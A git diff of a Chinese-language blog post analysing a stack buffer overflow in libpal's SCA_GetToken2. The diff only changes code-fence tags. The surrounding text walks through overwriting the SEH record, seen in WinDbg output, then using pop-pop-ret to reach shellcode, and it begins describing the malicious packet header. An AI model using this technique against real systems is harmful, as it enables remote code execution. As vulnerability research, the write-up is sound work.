@@ -7,7 +7,7 @@ layout: default
 >libpal.int __cdecl SCA_GetToken2(char const *, unsigned long *, char *, unsigned long, char)
 >未正确分配局部变量栈空间
 
-```c
+```
 数据读取流程:
 	####1.此处会判断length <= 400H分配栈空间, length>400H分配堆空间
 	WaitForMessage(ulong,SCA_NetMessage *)
@@ -22,7 +22,7 @@ layout: default
 ```
 # 2.栈空间检查
 
-```c
+```
 通过上面的逻辑分析得到:
 	1. 第2步中有一个完整的数据写入了栈空间.(合法)
 	2. 第4步中将第2步写入的数据进行了部分读取(104H)并溢出.(非法)
@@ -31,7 +31,7 @@ layout: default
 
 > 验证一下SEH是否被覆盖
 
-```c
+```
 0:009> !teb
 TEB at 00312000
     ExceptionList:        01befe1c
@@ -52,7 +52,7 @@ ntdll!_EXCEPTION_REGISTRATION_RECORD
 
 > 成功覆盖. 此时栈内应该有2个发送的数据: 一个完整数据(合法),一个不完整数据(非法).
 
-```c
+```
 //第一次数据全部写入栈(合法),但没有覆盖到关键SEH
 0:009> dds 01befc70-1e0
 01befa90  41414141
@@ -82,7 +82,7 @@ ntdll!_EXCEPTION_REGISTRATION_RECORD
 
 > 1. 怎么使SEH跳转到ShellCode,虽然EIP己经能够被我们控制,但需要jmp到栈上执行代码.
 
-```c
+```
 SEH handler原型为:
 typedef EXCEPTION_DISPOSITION _except_handler (*PEXCEPTION_ROUTINE) (  
     IN PEXCEPTION_RECORD ExceptionRecord,  
@@ -111,7 +111,7 @@ ret
 
 > 2.另一个问题.
 
-```c
+```
 此时SEH变为:
 0:009> dt _EXCEPTION_REGISTRATION_RECORD 0x01beff54 
 ntdll!_EXCEPTION_REGISTRATION_RECORD
@@ -130,7 +130,7 @@ _except_handler成功被调用执行了pop,pop,ret后,EIP会跳转到:
 ```
 > 3. 跳转到完整的ShellCode.
 
-```c
+```
 根据上面所述: 
 	这里EIP所指向的地址ShellCode并不完整,那么下一步就是让EIP跳转到完整的ShellCode地址去执行.
 	此时只需要计算一下ESP的偏移,然后jmp过去即可解决.
@@ -146,7 +146,7 @@ _except_handler成功被调用执行了pop,pop,ret后,EIP会跳转到:
 
 # 4.一些补充
 
-```c
+```
 数据包格式:
 先读24(0x18)字节包头
   header =  b"\x75\x19\xba\xab"           	#包头校验码 cmp dword ptr ss:[esp+20],ABBA1975  
